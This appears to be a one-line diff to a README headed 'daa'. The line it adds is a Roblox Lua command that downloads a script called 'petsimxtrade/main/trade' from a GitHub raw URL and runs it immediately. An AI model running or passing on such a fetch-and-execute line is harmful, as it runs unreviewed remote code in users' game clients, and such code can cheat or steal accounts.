@@ -1,1 +1,3 @@
 # daa
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pipiyt/petsimxtrade/main/trade"))()
